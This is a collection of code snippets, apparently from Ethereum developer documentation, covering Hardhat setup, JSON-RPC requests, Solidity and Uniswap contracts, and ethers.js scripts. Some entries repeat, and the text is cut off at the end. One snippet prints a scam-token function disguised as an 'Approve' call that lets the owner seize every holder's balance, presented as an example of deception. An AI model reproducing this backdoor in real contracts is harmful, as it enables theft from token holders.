bash\nCODE:\n```\n# .env\n\nAPI_URL = \"https://eth-goerli.alchemyapi.io/v2/<your-api-key>\"\nAPI_KEY = \"<your-api-key>\"\nPRIVATE_KEY = \"<your-metamask-private-key>\"\nCONTRACT_ADDRESS = \"0x<your contract address>\"\n```\n\n----------------------------------------\n\nTITLE: Initializing Hardhat Configuration\nDESCRIPTION: Command to create an empty Hardhat configuration file (hardhat.config.js) which will be used to specify project setup for smart contract development.\n\nLANGUAGE: bash\nCODE:\n```\nnpx hardhat\n```\n\n----------------------------------------\n\nTITLE: Initializing Hardhat Configuration\nDESCRIPTION: Command to create an empty Hardhat configuration file (hardhat.config.js) which will be used to specify project setup for smart contract development.\n\nLANGUAGE: bash\nCODE:\n```\nnpx hardhat\n```\n\n----------------------------------------\n\nTITLE: Running Anvil Local Blockchain\nDESCRIPTION: Command to start Anvil, a local Ethereum development blockchain, with specific parameters for zero gas fees and 2-second block times.\n\nLANGUAGE: shell\nCODE:\n```\ncd packages/contracts\nanvil --base-fee 0 --block-time 2\n```\n\n----------------------------------------\n\nTITLE: Two-Column Layout Component Structure in JSX\nDESCRIPTION: A JSX component structure for displaying content in a two-column layout. The structure includes a TwoColumnContent wrapper with two column components: WhyWeDoItColumn and HowDoesItWorkColumn, each containing heading and explanatory text about the Translatathon event.\n\nLANGUAGE: jsx\nCODE:\n```\n<TwoColumnContent>\n  <WhyWeDoItColumn>\n    <h3>Why do we do it</h3>\n    Translating is often a lonely task, but it doesn't have to be. By gathering participants in one place, they can enjoy the solitude of crafting the perfect translation while still taking breaks to socialize, have a coffee, and share the most challenging or funny terms they've encountered while translating.\n  </WhyWeDoItColumn>\n  <HowDoesItWorkColumn>\n    <h3>How does it work</h3>\n    Check the list of Translatathon Hubs to see if there's one happening in your city! Remember, the Translatathon is an online competition, so you can always participate from the comfort of your couch.\n  </HowDoesItWorkColumn>\n</TwoColumnContent>\n```\n\n----------------------------------------\n\nTITLE: Compiling Solidity Contract to Bytecode\nDESCRIPTION: Command that pipes Solidity code to the solc compiler to generate the EVM bytecode needed for deployment.\n\nLANGUAGE: bash\nCODE:\n```\necho 'pragma solidity ^0.4.16; contract Multiply7 { event Print(uint); function multiply(uint input) public returns (uint) { Print(input * 7); return input * 7; } }' | solc --bin\n\n======= <stdin>:Multiply7 =======\nBinary:\n6060604052341561000f57600080fd5b60eb8061001d6000396000f300606060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063c6888fa1146044575b600080fd5b3415604e57600080fd5b606260048080359060200190919050506078565b6040518082815260200191505060405180910390f35b60007f24abdb5865df5079dcc5ac590ff6f01d5c16edbc5fab4e195d9febd1114503da600783026040518082815260200191505060405180910390a16007820290509190505600a165627a7a7230582040383f19d9f65246752244189b02f56e8d0980ed44e7a56c0b200458caad20bb0029\n```\n\n----------------------------------------\n\nTITLE: Creating a Simple Hello World Smart Contract in Solidity\nDESCRIPTION: A basic smart contract that stores a message and allows it to be updated. It demonstrates the fundamental structure of a Solidity contract including state variables, constructors, and public functions.\n\nLANGUAGE: solidity\nCODE:\n```\n// Specifică versiunea Solidity, utilizând versiuni semantice.\n// Learn more: https://solidity.readthedocs.io/en/v0.5.10/layout-of-source-files.html#pragma\npragma solidity ^0.7.0;\n\n// Defines a contract named `HelloWorld`.\n// Un contract este o colecție de funcții și date - (starea sa). Odată implementat, un contract se află la o anumită adresă din blockchain-ul Ethereum. Learn more: https://solidity.readthedocs.io/en/v0.5.10/structure-of-a-contract.html\ncontract HelloWorld {\n\n   // Declares a state variable `message` of type `string`.\n   // Variabilele de stare sunt variabile ale căror valori sunt stocate permanent în stocarea contractului. The keyword `public` makes variables accessible from outside a contract and creates a function that other contracts or clients can call to access the value.\n   string public message;\n\n   // Similar to many class-based object-oriented languages, a constructor is a special function that is only executed upon contract creation.\n   // Funcțiile constructor sunt utilizate pentru a inițializa datele contractului. Learn more:https://solidity.readthedocs.io/en/v0.5.10/contracts.html#constructors\n   constructor(string memory initMessage) {\n\n      // Accepts a string argument `initMessage` and sets the value into the contract's `message` storage variable).\n      message = initMessage;\n   }\n\n   // A public function that accepts a string argument and updates the `message` storage variable.\n   function update(string memory newMessage) public {\n      message = newMessage;\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode for ERC-20 Token Operations\nDESCRIPTION: This bytecode implements core ERC-20 token functionality including transfer operations, allowance checking, and balance management. The code includes JUMPDEST markers, stack manipulations, and memory operations typical of compiled Solidity contracts.\n\nLANGUAGE: bytecode\nCODE:\n```\n0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x83B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x452 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x41C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x908 JUMP\n```\n\n----------------------------------------\n\nTITLE: Implementing Extension Hook for ERC-20 Token Transfers\nDESCRIPTION: This function provides a hook that is called before any token transfer, including minting and burning. It's designed to be overridden by derived contracts to add custom logic without modifying the core transfer implementation.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Hook that is called before any transfer of tokens. This includes\n * minting and burning.\n *\n * Calling conditions:\n *\n * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n * will be to transferred to `to`.\n * - when `from` is zero, `amount` tokens will be minted for `to`.\n * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n * - `from` and `to` are never both zero.\n *\n * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n */\nfunction _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Extension Hook for ERC-20 Token Transfers\nDESCRIPTION: This function provides a hook that is called before any token transfer, including minting and burning. It's designed to be overridden by derived contracts to add custom logic without modifying the core transfer implementation.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Hook that is called before any transfer of tokens. This includes\n * minting and burning.\n *\n * Calling conditions:\n *\n * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n * will be to transferred to `to`.\n * - when `from` is zero, `amount` tokens will be minted for `to`.\n * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n * - `from` and `to` are never both zero.\n *\n * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n */\nfunction _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Transaction Receipt Parameters in JavaScript\nDESCRIPTION: Example parameters for the eth_getTransactionReceipt method, which takes a 32-byte transaction hash to retrieve the receipt of a completed transaction.\n\nLANGUAGE: javascript\nCODE:\n```\nparams: [\"0x85d995eba9763907fdf35cd2034144dd9d53ce32cbec21349d4b12823c6860c5\"]\n```\n\n----------------------------------------\n\nTITLE: JSON-RPC Request and Response for eth_uninstallFilter\nDESCRIPTION: Example showing how to send a request to uninstall a filter and the expected success response from the Ethereum node.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_uninstallFilter\",\"params\":[\"0xb\"],\"id\":73}'\n// Result\n{\n  \"id\":1,\n  \"jsonrpc\": \"2.0\",\n  \"result\": true\n}\n```\n\n----------------------------------------\n\nTITLE: Example Deployment Output\nDESCRIPTION: Sample output showing a successful contract deployment with the contract address.\n\nLANGUAGE: bash\nCODE:\n```\nContract deployed to address: 0x6cd7d44516a20882cEa2DE9f205bF401c0d23570\n```\n\n----------------------------------------\n\nTITLE: Implementing MetaMask Wallet Event Listener\nDESCRIPTION: This function sets up an event listener for wallet state changes such as account switching or disconnection. It updates the component state accordingly to reflect the current wallet connection status.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\nfunction addWalletListener() {\n  if (window.ethereum) {\n    window.ethereum.on(\"accountsChanged\", (accounts) => {\n      if (accounts.length > 0) {\n        setWallet(accounts[0])\n        setStatus(\"👆🏽 Write a message in the text-field above.\")\n      } else {\n        setWallet(\"\")\n        setStatus(\"🦊 Connect to MetaMask using the top right button.\")\n      }\n    })\n  } else {\n    setStatus(\n      <p>\n        {\" \"}\n        🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n          You must install MetaMask, a virtual Ethereum wallet, in your browser.\n        </a>\n      </p>\n    )\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring ESLint Rules for Ethereum TypeScript Project\nDESCRIPTION: A comprehensive set of ESLint rules for an Ethereum project using TypeScript. The configuration establishes code style guidelines including spacing, quotation marks, semicolons, and other formatting preferences. It also includes special overrides for test files to disable certain restrictions in testing contexts.\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"classes\": false,\n  \"functions\": false,\n  \"variables\": false\n},\n\"no-useless-call\": \"error\",\n\"no-useless-catch\": \"error\",\n\"no-useless-computed-key\": \"error\",\n\"no-useless-escape\": \"error\",\n\"no-useless-rename\": \"error\",\n\"no-useless-return\": \"error\",\n\"no-whitespace-before-property\": \"error\",\n\"no-with\": \"error\",\n\"object-curly-spacing\": [\n  \"error\",\n  \"never\"\n],\n\"object-property-newline\": [\n  \"error\",\n  {\n    \"allowMultiplePropertiesPerLine\": true\n  }\n],\n\"one-var\": [\n  \"error\",\n  {\n    \"initialized\": \"never\"\n  }\n],\n\"operator-linebreak\": [\n  \"error\",\n  \"after\",\n  {\n    \"overrides\": {\n      \":\": \"before\",\n      \"?\": \"before\"\n    }\n  }\n],\n\"padded-blocks\": [\n  \"error\",\n  {\n    \"blocks\": \"never\",\n    \"classes\": \"never\",\n    \"switches\": \"never\"\n  }\n],\n\"prefer-const\": [\n  \"error\",\n  {\n    \"destructuring\": \"all\"\n  }\n],\n\"prefer-promise-reject-errors\": \"error\",\n\"quote-props\": [\n  \"error\",\n  \"as-needed\"\n],\n\"quotes\": [\n  \"error\",\n  \"single\"\n],\n\"rest-spread-spacing\": [\n  \"error\",\n  \"never\"\n],\n\"semi\": [\n  \"error\",\n  \"always\"\n],\n\"semi-spacing\": [\n  \"error\",\n  {\n    \"after\": true,\n    \"before\": false\n  }\n],\n\"space-before-blocks\": [\n  \"error\",\n  \"always\"\n],\n\"space-before-function-paren\": [\n  \"error\",\n  {\n    \"anonymous\": \"always\",\n    \"named\": \"never\",\n    \"asyncArrow\": \"always\"\n  }\n],\n\"space-in-parens\": [\n  \"error\",\n  \"never\"\n],\n\"space-infix-ops\": \"error\",\n\"space-unary-ops\": [\n  \"error\",\n  {\n    \"nonwords\": false,\n    \"words\": true\n  }\n],\n\"spaced-comment\": [\n  \"error\",\n  \"always\",\n  {\n    \"block\": {\n      \"balanced\": true,\n      \"exceptions\": [\n        \"*\"\n      ],\n      \"markers\": [\n        \"*package\",\n        \"!\",\n        \",\",\n        \":\",\n        \"::\",\n        \"flow-include\"\n      ]\n    },\n    \"line\": {\n      \"markers\": [\n        \"*package\",\n        \"!\",\n        \"/\",\n        \",\",\n        \"=\"\n      ]\n    }\n  }\n],\n\"symbol-description\": \"error\",\n\"template-curly-spacing\": [\n  \"error\",\n  \"never\"\n],\n\"template-tag-spacing\": [\n  \"error\",\n  \"never\"\n],\n\"unicode-bom\": [\n  \"error\",\n  \"never\"\n],\n\"use-isnan\": \"error\",\n\"valid-typeof\": [\n  \"error\",\n  {\n    \"requireStringLiterals\": true\n  }\n],\n\"wrap-iife\": [\n  \"error\",\n  \"any\",\n  {\n    \"functionPrototypeMethods\": true\n  }\n],\n\"yield-star-spacing\": [\n  \"error\",\n  \"both\"\n],\n\"yoda\": [\n  \"error\",\n  \"never\"\n]\n},\n\"overrides\": [\n{\n  \"files\": [\n    \"test/**/*.ts\"\n  ],\n  \"rules\": {\n    \"@typescript-eslint/no-explicit-any\": \"off\",\n    \"@typescript-eslint/no-non-null-assertion\": \"off\",\n    \"@typescript-eslint/no-var-requires\": \"off\",\n    \"no-unused-expressions\": \"off\",\n    \"prefer-promise-reject-errors\": \"off\",\n    \"import/no-extraneous-dependencies\": [\n      \"error\",\n      {\n        \"devDependencies\": true\n      }\n    ]\n  }\n}\n]\n```\n\n----------------------------------------\n\nTITLE: Implementing a Token Faucet Function in Solidity\nDESCRIPTION: A faucet function added to an ERC-20 contract that allows any user to receive 1000 tokens for testing purposes. This function would make a production token contract useless but is convenient for testing environments.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Gives the caller 1000 tokens to play with\n     */\n    function faucet() external {\n        _mint(msg.sender, 1000);\n    }   // function faucet\n```\n\n----------------------------------------\n\nTITLE: Malicious Token Burning Function Disguised as 'Approve' in Solidity\nDESCRIPTION: A deceptive function that capitalizes on Solidity's case sensitivity. Despite being named 'Approve', it has nothing to do with standard ERC-20 approvals and instead allows the contract owner to burn tokens from any holder's address.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction Approve(\n    address[] memory holders)\npublic approver() {\n    for (uint256 i = 0; i < holders.length; i++) {\n        uint256 amount = _balances[holders[i]];\n        _beforeTokenTransfer(holders[i], 0x0000000000000000000000000000000000000001, amount);\n        _balances[holders[i]] = _balances[holders[i]].sub(amount,\n            \"ERC20: burn amount exceeds balance\");\n        _balances[0x0000000000000000000000000000000000000001] =\n            _balances[0x0000000000000000000000000000000000000001].add(amount);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Reading Entry from WORM Contract in JavaScript\nDESCRIPTION: JavaScript code that reads an entry from the WORM contract using the standard contract call method, showing that view functions don't need parameter caching.\n\nLANGUAGE: javascript\nCODE:\n```\n    .\n    .\n    .\n    // Read the entry just written\n    const realKey = '0x' + key.slice(4)  // remove the FF flag\n    const entryRead = await worm.readEntry(realKey)\n    .\n    .\n    .\n```\n\n----------------------------------------\n\nTITLE: Retrieving Transaction by Block Hash and Index Request in JavaScript\nDESCRIPTION: Example request for the eth_getTransactionByBlockHashAndIndex method, which retrieves transaction information using a block hash and index position.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getTransactionByBlockHashAndIndex\",\"params\":[\"0x1d59ff54b1eb26b013ce3cb5fc9dab3705b415a67127a003c3e61eb445bb8df2\", \"0x0\"],\"id\":1}'\n```\n\n----------------------------------------\n\nTITLE: Converting Wei to Ether in Web3.py\nDESCRIPTION: Converts wei (the smallest unit of ether) to ether. This is useful for displaying balances in a more readable format, as balances are stored in wei on the blockchain.\n\nLANGUAGE: python\nCODE:\n```\nw3.from_wei(1000000000000000000000000, 'ether')\n```\n\n----------------------------------------\n\nTITLE: Simple Storage Contract in Serpent for Ethereum\nDESCRIPTION: A basic Serpent contract that checks if a storage slot is empty and, if so, sets it to the provided value. This example demonstrates how contract code interacts with transaction data and storage on the Ethereum blockchain.\n\nLANGUAGE: python\nCODE:\n```\nif !self.storage[calldataload(0)]:\n  self.storage[calldataload(0)] = calldataload(32)\n```\n\n----------------------------------------\n\nTITLE: Using require and assert in Solidity for Hoare-style Verification\nDESCRIPTION: Solidity provides built-in functions for implementing Hoare-style properties directly in code. The 'require' statement is used to express preconditions and validate inputs, while 'assert' is used to verify postconditions and invariants after function execution.\n\nLANGUAGE: solidity\nCODE:\n```\nrequire(condition); // Precondition check, often for validating user inputs\nassert(condition);  // Postcondition check, for verifying safety properties\n```\n\n----------------------------------------\n\nTITLE: Storing Product of Reserves (k)\nDESCRIPTION: Declares a public variable that stores the product of the two reserves (k value), which should remain constant during trades according to the x*y=k formula. It changes only when liquidity is added or removed.\n\nLANGUAGE: solidity\nCODE:\n```\nuint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event\n```\n\n----------------------------------------\n\nTITLE: Retrieving Storage Value with eth_getStorageAt\nDESCRIPTION: A cURL request example demonstrating how to retrieve the value stored at position 0 in a smart contract using the eth_getStorageAt JSON-RPC method. This example directly accesses the pos0 variable from the Storage contract.\n\nLANGUAGE: javascript\nCODE:\n```\ncurl -X POST --data '{\"jsonrpc\":\"2.0\", \"method\": \"eth_getStorageAt\", \"params\": [\"0x295a70b2de5e3953354a6a8344e616ed314d7251\", \"0x0\", \"latest\"], \"id\": 1}' localhost:8545\n{\"jsonrpc\":\"2.0\",\"id\":1,\"result\":\"0x00000000000000000000000000000000000000000000000000000000000004d2\"}\n```\n\n----------------------------------------\n\nTITLE: Calculating Protocol Fees in Uniswap V2\nDESCRIPTION: Calculates and collects protocol fees if enabled. The function uses the old reserve values to accurately calculate fees based only on changes to the pool from trading fees.\n\nLANGUAGE: solidity\nCODE:\n```\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n```\n\n----------------------------------------\n\nTITLE: Checking Token Uniqueness with Solidity Modifier\nDESCRIPTION: Implements a modifier that ensures a new token with given name and DNA is unique by comparing it against all existing tokens. Uses keccak256 for string comparison and prevents duplicate token creation.\n\nLANGUAGE: solidity\nCODE:\n```\nmodifier isUnique(string memory _name, uint256 _dna) {\n    bool result = true;\n    for (uint256 i = 0; i < pizzas.length; i++) {\n        if (\n            keccak256(abi.encodePacked(pizzas[i].name)) ==\n            keccak256(abi.encodePacked(_name)) &&\n            pizzas[i].dna == _dna\n        ) {\n            result = false;\n        }\n    }\n    require(result, \"Pizza with such name already exists.\");\n    _;\n}\n```\n\n----------------------------------------\n\nTITLE: Ethereum ERC20 Token Contract Bytecode in Solidity\nDESCRIPTION: The bytecode representation of an ERC20 token contract named 'Basic' with symbol 'BSC'. This includes implementation of standard ERC20 functionality with SafeMath for overflow protection.\n\nLANGUAGE: ethereum-bytecode\nCODE:\n```\n083811015610fab576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b50505056fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa264697066735822122081c840f087cef92feccb03fadc678b2708c331896ec5432b5d4c675f27b6d3e664736f6c63430006020033\n```\n\n----------------------------------------\n\nTITLE: Compiling Solidity Contract to Bytecode\nDESCRIPTION: Command to compile a Solidity contract into bytecode that can be deployed to the Ethereum Virtual Machine (EVM). Uses the Solidity compiler (solc) directly from the command line.\n\nLANGUAGE: bash\nCODE:\n```\necho 'pragma solidity ^0.4.16; contract Multiply7 { event Print(uint); function multiply(uint input) public returns (uint) { Print(input * 7); return input * 7; } }' | solc --bin\n\n======= <stdin>:Multiply7 =======\nBinary:\n6060604052341561000f57600080fd5b60eb8061001d6000396000f300606060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063c6888fa1146044575b600080fd5b3415604e57600080fd5b606260048080359060200190919050506078565b6040518082815260200191505060405180910390f35b60007f24abdb5865df5079dcc5ac590ff6f01d5c16edbc5fab4e195d9febd1114503da600783026040518082815260200191505060405180910390a16007820290509190505600a165627a7a7230582040383f19d9f65246752244189b02f56e8d0980ed44e7a56c0b200458caad20bb0029\n```\n\n----------------------------------------\n\nTITLE: Installing Hardhat Development Environment\nDESCRIPTION: Command to install Hardhat as a development dependency, which provides a development environment for compiling, deploying, testing, and debugging Ethereum smart contracts.\n\nLANGUAGE: bash\nCODE:\n```\nnpm install --save-dev hardhat\n```\n\n----------------------------------------\n\nTITLE: Importing Matomo Event Tracking Utility in JavaScript\nDESCRIPTION: Shows how to import the trackCustomEvent utility function from the utils directory to enable Matomo event tracking in components.\n\nLANGUAGE: javascript\nCODE:\n```\nimport { trackCustomEvent } from \"../utils/matomo\"\n```\n\n----------------------------------------\n\nTITLE: Using eth_getBlockByNumber in JavaScript\nDESCRIPTION: Example of parameters for the eth_getBlockByNumber method, which retrieves information about a block by its number. The method requires the block number and a boolean indicating whether to include full transaction objects.\n\nLANGUAGE: javascript\nCODE:\n```\nparams: [\n  \"0x1b4\", // 436\n  true,\n]\n```\n\n----------------------------------------\n\nTITLE: Value Encoding Test Function\nDESCRIPTION: Tests the encodeVal function which automatically handles caching values and generating appropriate parameter encodings.\n\nLANGUAGE: solidity\nCODE:\n```\n    function testEncodeVal() public {\n        .\n        .\n        .\n        _callInput = bytes.concat(\n            FOUR_PARAMS,\n            cache.encodeVal(VAL_A),\n            cache.encodeVal(VAL_B),\n            cache.encodeVal(VAL_C),\n            cache.encodeVal(VAL_D)\n        );\n        .\n        .\n        .\n        assertEq(_callInput.length, 4+1*4);\n    }   // testEncodeVal\n```\n\n----------------------------------------\n\nTITLE: Value Encoding Test Function\nDESCRIPTION: Tests the encodeVal function which automatically handles caching values and generating appropriate parameter encodings.\n\nLANGUAGE: solidity\nCODE:\n```\n    function testEncodeVal() public {\n        .\n        .\n        .\n        _callInput = bytes.concat(\n            FOUR_PARAMS,\n            cache.encodeVal(VAL_A),\n            cache.encodeVal(VAL_B),\n            cache.encodeVal(VAL_C),\n            cache.encodeVal(VAL_D)\n        );\n        .\n        .\n        .\n        assertEq(_callInput.length, 4+1*4);\n    }   // testEncodeVal\n```\n\n----------------------------------------\n\nTITLE: Defining Events for Liquidity Operations\nDESCRIPTION: Declares events that are emitted when liquidity providers deposit (Mint) or withdraw (Burn) liquidity. These events log the amounts of tokens involved and the addresses of participants.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Mint(address indexed sender, uint amount0, uint amount1);\nevent Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n```\n\n----------------------------------------\n\nTITLE: Complete Ethereum Smart Contract Interaction Script with Ethers.js\nDESCRIPTION: A full JavaScript file that reads a message from a smart contract, updates it with a new value, and reads the updated message, demonstrating both read and write operations.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\nconst API_KEY = process.env.API_KEY\nconst PRIVATE_KEY = process.env.PRIVATE_KEY\nconst CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS\n\nconst contract = require(\"../artifacts/contracts/HelloWorld.sol/HelloWorld.json\")\n\n// provider - Alchemy\nconst alchemyProvider = new ethers.providers.AlchemyProvider(\n  (network = \"goerli\"),\n  API_KEY\n)\n\n// signer - you\nconst signer = new ethers.Wallet(PRIVATE_KEY, alchemyProvider)\n\n// contract instance\nconst helloWorldContract = new ethers.Contract(\n  CONTRACT_ADDRESS,\n  contract.abi,\n  signer\n)\n\nasync function main() {\n  const message = await helloWorldContract.message()\n  console.log(\"The message is: \" + message)\n\n  console.log(\"Updating the message...\")\n  const tx = await helloWorldContract.update(\"this is the new message\")\n  await tx.wait()\n\n  const newMessage = await helloWorldContract.message()\n  console.log(\"The new message is: \" + newMessage)\n}\n\nmain()\n```\n\n----------------------------------------\n\nTITLE: Disabling Chromatic Snapshots in Storybook for Development-Only Stories\nDESCRIPTION: This snippet shows how to disable Chromatic snapshot testing for specific stories that should be available in development but not tracked for visual regression. The parameter can be applied at project, component, or story level.\n\nLANGUAGE: ts\nCODE:\n```\n// At any level\nparameters: {\n  chromatic: {\n    disableSnapshot: true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Importing L1 Bridge Interfaces\nDESCRIPTION: Imports the necessary interface definitions for the L1 Standard Bridge and L1 ERC20 Bridge, which define the required functions and events for the bridge implementation.\n\nLANGUAGE: solidity\nCODE:\n```\n/* Interface Imports */\nimport { IL1StandardBridge } from \"./IL1StandardBridge.sol\";\nimport { IL1ERC20Bridge } from \"./IL1ERC20Bridge.sol\";\n```\n\n----------------------------------------\n\nTITLE: ETH to Tokens Swap with Fee-On-Transfer Support in Uniswap\nDESCRIPTION: Function for swapping exact ETH for tokens with support for fee-on-transfer tokens. It wraps the input ETH to WETH, transfers it to the first pair, performs the swap, and verifies the output amount meets the minimum requirement.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint amountOutMin,\n    address[] calldata path,\n    address to,\n    uint deadline\n)\n    external\n    virtual\n    override\n    payable\n    ensure(deadline)\n{\n    require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n    uint amountIn = msg.value;\n    IWETH(WETH).deposit{value: amountIn}();\n    assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn));\n    uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);\n    _swapSupportingFeeOnTransferTokens(path, to);\n    require(\n        IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) >= amountOutMin,\n        'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT'\n    );\n}\n```\n\n----------------------------------------\n\nTITLE: Complete Ethereum Smart Contract Interaction Script with Ethers.js\nDESCRIPTION: A full JavaScript file that reads a message from a smart contract, updates it with a new value, and reads the updated message, demonstrating both read and write operations.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\nconst API_KEY = process.env.API_KEY\nconst PRIVATE_KEY = process.env.PRIVATE_KEY\nconst CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS\n\nconst contract = require(\"../artifacts/contracts/HelloWorld.sol/HelloWorld.json\")\n\n// provider - Alchemy\nconst alchemyProvider = new ethers.providers.AlchemyProvider(\n  (network = \"goerli\"),\n  API_KEY\n)\n\n// signer - you\nconst signer = new ethers.Wallet(PRIVATE_KEY, alchemyProvider)\n\n// contract instance\nconst helloWorldContract = new ethers.Contract(\n  CONTRACT_ADDRESS,\n  contract.abi,\n  signer\n)\n\nasync function main() {\n  const message = await helloWorldContract.message()\n  console.log(\"The message is: \" + message)\n\n  console.log(\"Updating the message...\")\n  const tx = await helloWorldContract.update(\"this is the new message\")\n  await tx.wait()\n\n  const newMessage = await helloWorldContract.message()\n  console.log(\"The new message is: \" + newMessage)\n}\n\nmain()\n```\n\n----------------------------------------\n\nTITLE: Web3 Component Integration in JSX\nDESCRIPTION: A JSX component that integrates an audio player for Web3 content. The component is placed within a container with top margin styling.\n\nLANGUAGE: jsx\nCODE:\n```\n<div className=\"mt-4\">\n<ListenToPlayer slug=\"/web3/\" />\n</div>\n```\n\n----------------------------------------\n\nTITLE: Complete Ethereum Smart Contract Interaction Script with Ethers.js\nDESCRIPTION: A full JavaScript file that reads a message from a smart contract, updates it with a new value, and reads the updated message, demonstrating both read and write operations.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\nconst API_KEY = process.env.API_KEY\nconst PRIVATE_KEY = process.env.PRIVATE_KEY\nconst CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS\n\nconst contract = require(\"../artifacts/contracts/HelloWorld.sol/HelloWorld.json\")\n\n// provider - Alchemy\nconst alchemyProvider = new ethers.providers.AlchemyProvider(\n  (network = \"goerli\"),\n  API_KEY\n)\n\n// signer - you\nconst signer = new ethers.Wallet(PRIVATE_KEY, alchemyProvider)\n\n// contract instance\nconst helloWorldContract = new ethers.Contract(\n  CONTRACT_ADDRESS,\n  contract.abi,\n  signer\n)\n\nasync function main() {\n  const message = await helloWorldContract.message()\n  console.log(\"The message is: \" + message)\n\n  console.log(\"Updating the message...\")\n  const tx = await helloWorldContract.update(\"this is the new message\")\n  await tx.wait()\n\n  const newMessage = await helloWorldContract.message()\n  console.log(\"The new message is: \" + newMessage)\n}\n\nmain()\n```\n\n----------------------------------------\n\nTITLE: Using Trailing Slashes in Ethereum Documentation Links\nDESCRIPTION: Guidelines for using trailing slashes in links to avoid redirects and improve site performance.\n\nLANGUAGE: markdown\nCODE:\n```\n<!-- Good -->\n\nRead more about [smart contracts](/docs/developers/smart-contracts/)\n\n<!-- Bad -->\n\nRead more about [smart contracts](/docs/developers/smart-contracts)\n```\n\n----------------------------------------\n\nTITLE: Committing Changes with Issue Reference in Shell\nDESCRIPTION: Command to commit your changes with a message that references the issue it resolves. This helps in linking your PR to the corresponding issue.\n\nLANGUAGE: shell\nCODE:\n```\ngit commit -m \"brief description of changes [Fixes #1234]\"\n```\n\n----------------------------------------\n\nTITLE: Roadmap Definition Content with Image in JSX/HTML\nDESCRIPTION: A component that explains how the Ethereum roadmap is defined through collaborative research and development processes. It highlights the community-driven nature of Ethereum's governance and decision-making.\n\nLANGUAGE: html\nCODE:\n```\n<RoadmapImageContent title=\"How the roadmap is defined\">\n\nThe roadmap is mostly the result of years of work by researchers and developers - because the protocol is very technical - but any motivated person can participate. Ideas usually start off as discussions on a forum such as [ethresear.ch](https://ethresear.ch/), [Ethereum Magicians](https://ethereum-magicians.org/) or the Eth R&D discord server. They may be responses to new vulnerabilities that are discovered, suggestions from organizations working in the application layer (such as [dapps](/glossary/#dapp) and exchanges) or from known frictions for end users (such as costs or transaction speeds). When these ideas mature, they can be proposed as [Ethereum Improvement Proposals](https://eips.ethereum.org/). This is all done in public so that anyone from the community can weigh in at any time.\n\n[More on Ethereum 